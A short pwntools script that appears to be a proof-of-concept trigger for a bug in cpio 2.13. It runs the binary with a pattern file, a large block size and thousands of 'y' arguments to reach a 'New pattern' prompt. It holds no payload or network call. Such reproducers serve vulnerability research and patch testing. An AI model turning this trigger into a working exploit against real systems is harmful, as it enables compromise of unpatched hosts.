#!/usr/bin/env python3

from pwn import *

PATTERN_FILE = "./patt"
CPIO_BINARY = "./cpio-2.13/src/cpio"
BLOCK_SIZE = 1<<20
NUM_PATTERNS = 20000

cmd = f"{CPIO_BINARY} -iv -E {PATTERN_FILE} -r --block-size={BLOCK_SIZE} " + "y "*(NUM_PATTERNS-1)

p = process(cmd.split())
out = p.recvuntil("New pattern")
print(out.decode(), end='')
print(p.recv().decode())
# p.interactive()
p.close()
exit()
